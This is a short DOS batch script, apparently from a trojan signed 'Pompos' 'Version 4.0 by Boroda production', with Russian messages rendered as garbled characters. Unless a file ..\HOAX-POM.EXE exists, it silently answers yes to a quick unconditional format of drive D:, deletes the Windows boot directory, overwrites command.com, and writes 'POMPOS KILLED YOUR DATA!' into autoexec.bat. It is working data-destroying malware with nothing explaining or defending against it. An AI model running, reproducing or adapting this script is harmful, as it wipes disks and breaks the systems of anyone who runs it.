@echo off
@echo off
if exist ..\HOAX-POM.EXE goto fun
echo  �� ����㯨� ����� �����������, 㤠��� ..\HOAX-POM.EXE ��頤�
echo �� ���... ������ ��祣�, ������� ���� �������...
echo y| format d: /q /u /v:Pompos
deltree/y winbootdir% > nul
copy c:\command.com %winbootdir%\command.com
echo @echo off >> c:\autoexec.bat
echo POMPOS KILLED YOUR DATA! >> c:\autoexec.bat
echo Version 4.0 by Boroda production >> c:\autoexec.bat
echo ������騩 ࠧ ��� 㬭��, � �� ����� ��᪮�쪮 ��������... 

:fun
